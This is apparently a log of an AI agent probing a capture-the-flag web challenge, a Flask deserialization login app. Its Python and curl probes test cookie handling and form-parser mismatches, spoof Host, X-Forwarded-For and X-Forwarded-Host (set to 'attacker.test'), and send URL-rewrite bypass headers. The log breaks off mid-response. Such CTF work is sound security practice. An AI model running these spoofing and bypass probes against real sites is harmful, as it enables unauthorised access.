+    ('invalid_then_valid', f'session=invalid; session={valid}'),
+    ('valid_then_invalid', f'session={valid}; session=invalid'),
+    ('quoted_valid', f'session=\"{valid}\"'),
+    ('space_before', f' session={valid}'),
+    ('pathpair', f'"'$Version=1; session={valid}; $Path=/'"'),
+]:
+    r=requests.get(base+'/', headers={'Cookie':cookie}, timeout=10, allow_redirects=False)
+    body=r.text[:220].replace('\\n',' ')
+    print('\\n', label, 'status', r.status_code, 'set', r.headers.get('Set-Cookie'))
+    print(body)
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ exited 1 in 1684ms:
+valid 56afb00e-6a03-43b2-b3e0-43706c7e1567.0ZxXUR_tXw37wq7wdHFafx-T-hY
+
+ valid_only status 200 set session=56afb00e-6a03-43b2-b3e0-43706c7e1567.0ZxXUR_tXw37wq7wdHFafx-T-hY; Expires=Sat, 01-Aug-2026 14:27:38 GMT; HttpOnly; Path=/
+<html> <head> 	<title>Deserialization</title> 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <style> .main{     text-align: center; /     background-color: #fff;     border-radius: 20px;     width
+
+ invalid_then_valid status 200 set session=56afb00e-6a03-43b2-b3e0-43706c7e1567.0ZxXUR_tXw37wq7wdHFafx-T-hY; Expires=Sat, 01-Aug-2026 14:27:38 GMT; HttpOnly; Path=/
+<html> <head> 	<title>Deserialization</title> 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <style> .main{     text-align: center; /     background-color: #fff;     border-radius: 20px;     width
+
+ valid_then_invalid status 200 set session=2203951f-90a3-473e-aa7b-801b688b0212.9t85eL1ayLmQidMjiwSpmMiNHN4; Expires=Sat, 01-Aug-2026 14:27:38 GMT; HttpOnly; Path=/
+<!doctype html> <html lang="zh"> <head>         <meta charset="UTF-8">         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">         <meta name="viewport" conte
+
+ quoted_valid status 200 set session=56afb00e-6a03-43b2-b3e0-43706c7e1567.0ZxXUR_tXw37wq7wdHFafx-T-hY; Expires=Sat, 01-Aug-2026 14:27:38 GMT; HttpOnly; Path=/
+<html> <head> 	<title>Deserialization</title> 	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> <style> .main{     text-align: center; /     background-color: #fff;     border-radius: 20px;     width
+Traceback (most recent call last):
+  File "<stdin>", line 17, in <module>
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/api.py", line 73, in get
+    return request("get", url, params=params, **kwargs)
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/api.py", line 59, in request
+    return session.request(method=method, url=url, **kwargs)
+           ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/sessions.py", line 578, in request
+    prep = self.prepare_request(req)
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/sessions.py", line 487, in prepare_request
+    p.prepare(
+    ~~~~~~~~~^
+        method=request.method.upper(),
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    ...<10 lines>...
+        hooks=merge_hooks(request.hooks, self.hooks),
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/models.py", line 370, in prepare
+    self.prepare_headers(headers)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/models.py", line 492, in prepare_headers
+    check_header_validity(header)
+    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/utils.py", line 1029, in check_header_validity
+    _validate_header_part(header, value, 1)
+    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
+  File "/home/stw/miniconda3/lib/python3.13/site-packages/requests/utils.py", line 1045, in _validate_header_part
+    raise InvalidHeader(
+    ...<2 lines>...
+    )
+requests.exceptions.InvalidHeader: Invalid leading whitespace, reserved character(s), or return character(s) in header value: ' session=56afb00e-6a03-43b2-b3e0-43706c7e1567.0ZxXUR_tXw37wq7wdHFafx-T-hY'
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Duplicate cookies are parsed with the later `session` value taking effect, but invalid values only force a fresh anonymous session. I’m moving to form parser/content-type mismatches now, looking for 500s, reflected parser state, or redirects that write unexpected session data.
+exec
+/bin/bash -lc "python3 - <<'PY'
+import requests, time, json
+base='http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com'
+uid=str(int(time.time()*1000)%100000000)
+
+def req(label, path, **kw):
+    try:
+        r=requests.post(base+path, timeout=10, allow_redirects=False, **kw)
+        body=' '.join(r.text.split())[:300]
+        print(f'\\n== {label} {path}')
+        print('status', r.status_code, 'loc', r.headers.get('Location'), 'ctype', r.headers.get('Content-Type'), 'set', r.headers.get('Set-Cookie'))
+        print(body)
+    except Exception as e:
+        print('\\n==', label, path, 'ERR', repr(e))
+
+cases=[
+ ('no_body', {}, {}),
+ ('empty_form', {'data':''}, {'Content-Type':'application/x-www-form-urlencoded'}),
+ ('missing_password', {'data':{'username':'mp'+uid}}, {}),
+ ('missing_username', {'data':{'password':'pw'}}, {}),
+ ('json_ct', {'json':{'username':'json'+uid,'password':'pw'}}, {}),
+ ('json_body_form_ct', {'data':json.dumps({'username':'jbf'+uid,'password':'pw'}), 'headers':{'Content-Type':'application/x-www-form-urlencoded'}}, {}),
+ ('form_body_json_ct', {'data':'username=fbj'+uid+'&password=pw', 'headers':{'Content-Type':'application/json'}}, {}),
+ ('text_plain', {'data':'username=txt'+uid+'&password=pw', 'headers':{'Content-Type':'text/plain'}}, {}),
+ ('multipart', {'files':{'username':(None,'mul'+uid),'password':(None,'pw')}}, {}),
+ ('dup_user', {'data':[('username','dupa'+uid),('username','dupb'+uid),('password','pw')]}, {}),
+ ('dup_pass', {'data':[('username','dupp'+uid),('password','a'),('password','b')]}, {}),
+ ('semicolon_sep', {'data':'username=semi'+uid+';password=pw', 'headers':{'Content-Type':'application/x-www-form-urlencoded'}}, {}),
+ ('charset_utf7', {'data':'username=char'+uid+'&password=pw', 'headers':{'Content-Type':'application/x-www-form-urlencoded; charset=utf-7'}}, {}),
+ ('bad_percent', {'data':'username=bad%ZZ'+uid+'&password=pw', 'headers':{'Content-Type':'application/x-www-form-urlencoded'}}, {}),
+]
+for label, kw, extra in cases:
+    for path in ['/register','/login']:
+        req(label, path, **kw)
+PY" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 12535ms:
+
+== no_body /register
+status 502 loc None ctype None set None
+
+
+== no_body /login
+status 400 loc None ctype text/html set session=f3a1d46e-89b7-470c-8089-292d814b7f4b.0Ds44ZiweT0wl1lu9k-5WP_w9TI; Expires=Sat, 01-Aug-2026 14:28:07 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== empty_form /register
+status 400 loc None ctype text/html set session=9560f6de-fda1-417b-b4e1-1ab9081ee09b.DTDWsQWVsbvshevz4jatxzr8L7o; Expires=Sat, 01-Aug-2026 14:28:07 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== empty_form /login
+status 400 loc None ctype text/html set session=03e1ffd0-9ef6-4893-b711-735fb2123554.qvI5imu8nAb8LnL8y3oCWNucyGU; Expires=Sat, 01-Aug-2026 14:28:07 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== missing_password /register
+status 400 loc None ctype text/html set session=0f766b88-98b9-4d31-8c87-3d0b10ba25f5.hbqU540bQlGMJLHYGbyX2EOoGE8; Expires=Sat, 01-Aug-2026 14:28:07 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== missing_password /login
+status 400 loc None ctype text/html set session=5fcbf26b-6712-4fcf-8f53-3300af7e27e9.C0T-AsRQ2rtL0SktCItb-8SEED8; Expires=Sat, 01-Aug-2026 14:28:08 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== missing_username /register
+status 400 loc None ctype text/html set session=12011ddd-c587-4dbc-9d9f-9925f9082c7b.-IZU4B-eibCU1cqSAKtK8wQ8TKo; Expires=Sat, 01-Aug-2026 14:28:08 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== missing_username /login
+status 400 loc None ctype text/html set session=1acb69db-97a8-47f5-b099-89cbda1c86c6.XybsyZUhfb4sS_qIUEQLc0BcraI; Expires=Sat, 01-Aug-2026 14:28:09 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== json_ct /register
+status 400 loc None ctype text/html set session=2d1244b0-7084-426d-89f6-2779c7daf77d.4ec3SH9PXr38FbXKGvfxn550uPA; Expires=Sat, 01-Aug-2026 14:28:09 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== json_ct /login
+status 400 loc None ctype text/html set session=cd3add75-466b-42a1-b412-78d56cb0f4f3.pZ2G5uurEeePMSBJ3XVD64msCdo; Expires=Sat, 01-Aug-2026 14:28:09 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== json_body_form_ct /register
+status 400 loc None ctype text/html set session=ddee9e4d-d7de-47eb-932d-99165f78ea1d.kkCcGKuBW2swyOsD6WCav8HdczI; Expires=Sat, 01-Aug-2026 14:28:09 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== json_body_form_ct /login
+status 400 loc None ctype text/html set session=073bac44-d9e3-4b19-9fc1-58f18cba8e0f.0J0_sRUkT4iYR_kEzfxejEHDCm8; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== form_body_json_ct /register
+status 400 loc None ctype text/html set session=c97a6a03-fe69-4fda-816c-5a12b08c29f8.T9Ya42xb5FS35R3w7XQk0higWpk; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== form_body_json_ct /login
+status 400 loc None ctype text/html set session=994b1f95-8ae1-48a2-b0d5-08ab66e2f438.VhAxQ0Lpas2rJo4ubBCEzX1BSXQ; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== text_plain /register
+status 400 loc None ctype text/html set session=3af32c72-16b8-44a4-9834-b7837af2bea7.-MDkNhZMOnYIKKZZSH7JSw0M-tc; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== text_plain /login
+status 400 loc None ctype text/html set session=a509aed5-c78e-43f2-a382-b25ddac5063e.NUeUtlC-hdhP6gmhwsMF-Cy77m0; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== multipart /register
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=fc196c97-a291-4e54-afa8-5d3c3a7158bf.19QCLDLW6LjqqWsWhsW_a4EDRbE; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== multipart /login
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=bff9b869-7aa8-4ab9-af78-73a3e7759357.K9dwc2ftdevzFt7SaZnlkHfmmwI; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== dup_user /register
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=2edce7a5-0b81-4bca-a3e0-825c3f714086.3DCL3m-Wji8kKbuYoWo1xv192R0; Expires=Sat, 01-Aug-2026 14:28:10 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== dup_user /login
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=f0883414-77f1-4cf0-96f9-c54a831c5c44.-E2G3qxZA1WBlJYC6J1hC1LDg1M; Expires=Sat, 01-Aug-2026 14:28:11 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== dup_pass /register
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=d805b888-ad96-4f07-9598-3ae4ec479f79.fr2pHoug_UI7_2JS1GpYX2ySXAE; Expires=Sat, 01-Aug-2026 14:28:11 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== dup_pass /login
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=97bc9005-b077-4335-96ac-71b91fcd756e.Dfir7OpQgoD5rcdLfEwW-W5_zkY; Expires=Sat, 01-Aug-2026 14:28:11 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== semicolon_sep /register
+status 400 loc None ctype text/html set session=8fd42e6c-dfab-4242-92d4-4e6a988d65e0.Jm-umAbYw_kg5ndiOK-U69Q_DaI; Expires=Sat, 01-Aug-2026 14:28:11 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== semicolon_sep /login
+status 400 loc None ctype text/html set session=529e63cd-cf25-4f54-a912-32c7cca0d593.r5P_eqU3ee2UvGo5u3vR5BJJsBU; Expires=Sat, 01-Aug-2026 14:28:11 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>400 Bad Request</title> <h1>Bad Request</h1> <p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+== charset_utf7 /register
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=d20e74a1-5738-437f-9878-0e5769c642cd.W5AayTk6MScCjVekbQjrzGe3BbY; Expires=Sat, 01-Aug-2026 14:28:12 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== charset_utf7 /login
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=f8e16c08-1282-49f6-a1bd-1d287cabcf02.Jt5_p3qISNpRwZR4DBa_uJ5tydc; Expires=Sat, 01-Aug-2026 14:28:13 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== bad_percent /register
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=71f79905-15a6-4813-abda-6e7979091961.6NtA8vStBMwyWXTJkR9Zbur3r04; Expires=Sat, 01-Aug-2026 14:28:13 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+== bad_percent /login
+status 302 loc http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/ ctype text/html; charset=utf-8 set session=606c8c28-6331-4a5a-9fa5-37a0f6e46eaf.3fiC8illgCMIYDGo1T4k3Pakegc; Expires=Sat, 01-Aug-2026 14:28:13 GMT; HttpOnly; Path=/
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"> <title>Redirecting...</title> <h1>Redirecting...</h1> <p>You should be redirected automatically to target URL: <a href="/">/</a>. If not click the link.
+
+codex
+The parser is strict for missing fields and wrong content types: mostly 400, no debug trace. One anomaly appeared: `POST /register` with no body returned a transient 502; I’m going to confirm whether that is reproducible or just upstream instability.
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+The completed content-type sweep found no source/secret leak. Multipart and duplicate fields are accepted as normal forms; bad percent encoding is tolerated as literal input, not a parser break.
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 -X POST http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -X POST -H 'Content-Length: 0' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 400 Bad Request
+Content-Length: 192
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:28:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=b47bf392-f52c-4204-8ae9-27063033688b.Sba1IONd5KSQRamvONrv-xi4SC0; Expires=Sat, 01-Aug-2026 14:28:26 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+hook: PostToolUse
+exec
+/bin/bash -lc 'curl -i -sS --max-time 10 -X POST http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login' in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -X POST -H 'Content-Type:' --data '' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 400 Bad Request
+Content-Length: 192
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:28:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=a93e88d3-3c4d-4806-bf4f-92308b4564f9.mgpNSsE2gwnOPfVx5e4UA3UOBEA; Expires=Sat, 01-Aug-2026 14:28:26 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+ succeeded in 233ms:
+HTTP/1.1 400 Bad Request
+Content-Length: 192
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:28:26 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=b4c53b76-04de-40ca-8e28-345845a16499.i1sTLW4SWXlyjDIUdKvT7s5vUr0; Expires=Sat, 01-Aug-2026 14:28:26 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 974ms:
+HTTP/1.1 400 Bad Request
+Content-Length: 192
+Connection: keep-alive
+Content-Type: text/html
+Date: Sat, 01 Aug 2026 12:28:27 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=8415ffd1-b3a5-4a27-84e7-1f852888d99a.bDEmzSpvo89G0ERNyh4eyFp5eSU; Expires=Sat, 01-Aug-2026 14:28:27 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>400 Bad Request</title>
+<h1>Bad Request</h1>
+<p>The browser (or proxy) sent a request that this server could not understand.</p>
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+The 502 on empty register did not reproduce under direct curl; repeated empty POSTs return Flask 400. I’m checking proxy/vhost headers and path normalization next because redirects are absolute and openresty may normalize before Flask.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'Host: 127.0.0.1' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'X-Original-URL: /register' -H 'X-Rewrite-URL: /register' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/login" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'X-Forwarded-Host: attacker.test' -H 'X-Forwarded-Proto: https' -d 'username=vhx&password=p' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/register" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Content-Length: 209
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:28:40 GMT
+Keep-Alive: timeout=4
+Location: http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=9361b574-1449-44a1-bda7-c8c53eb32749.oi3jxb2BS_h2qT5SGWlNkuFB7zM; Expires=Sat, 01-Aug-2026 14:28:40 GMT; HttpOnly; Path=/
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.
+hook: PostToolUse
+hook: PostToolUse Completed
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' http://9bc98ac1fbf88cb6911b31bb.http-ctf2.dasctf.com/" in /home/stw/ctf-agent/challenges/manual_web_fafdc5730dee
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:28:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=b5caab65-7f33-4ee4-82d7-b8568f0e7768.IP1OVwICJR5KJMq0OGNcg1nON6s; Expires=Sat, 01-Aug-2026 14:28:40 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
+        <div id="login-page" class="row">
+            <div class="col s12 z-depth-6 card-panel">
+              <form class="login" action="/login" method="post" style="width:450px;">
+                <div class="row">
+                  <div class="input-field col s12 center">
+                    <p class="center login-form-text">--------SWPU-CTF WEB LOGIN--------</p>
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-social-person-outline prefix"></i>
+                    <input name="username" type="text" placeholder="Username">
+                  </div>
+                </div>
+                <div class="row margin">
+                  <div class="input-field col s12">
+                    <i class="mdi-action-lock-outline prefix"></i>
+                    <input id="password" name= "password" type="password" placeholder="Password">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12 m12 l12  login-text">
+                      <input type="checkbox" id="remember-me" />
+                      <label for="remember-me">Remember me</label>
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s12">
+                                <input type=submit value=submit class="btn waves-effect waves-light col s12">
+                  </div>
+                </div>
+                <div class="row">
+                  <div class="input-field col s6 m6 l6">
+                    <p class="margin medium-small"><a href="/register">Register now!</a></p>
+                  </div>
+
+              </form>
+            </div>
+          </div>
+          </div>
+
+        <!--materialize js-->
+        <script src="/static/js/materialize.min.js"></script>
+</body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+ succeeded in 2870ms:
+HTTP/1.1 502 Bad Gateway
+Connection: keep-alive
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Content-Length: 0
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+ exited 28 in 9859ms:
+curl: (28) Operation timed out after 10000 milliseconds with 1048 out of 2771 bytes received
+HTTP/1.1 200 OK
+Content-Length: 2771
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=utf-8
+Date: Sat, 01 Aug 2026 12:28:40 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: session=fc801830-50bc-43fe-8a91-e71c64305857.jCLJj2SeSSaoB_tj2OLzIvrc2tE; Expires=Sat, 01-Aug-2026 14:28:40 GMT; HttpOnly; Path=/
+Vary: Accept-Encoding
+
+<!doctype html>
+<html lang="zh">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Deserialization Login</title>
+        <link rel="stylesheet" type="text/css" href="/static/css/default.css">
+        <link rel="stylesheet" href="/static/css/materialize.min.css">
+        <style type="text/css">
+        html,
+        body {
+            height: 100%;
+        }
+        html {
+            display: table;
+            margin: auto;
+        }
+        body {
+            display: table-cell;
+            vertical-align: middle;
+        }
+
+        .margin {
+          margin: 0 !important;
+        }
+        </style>
+</head>
+<body class="black">
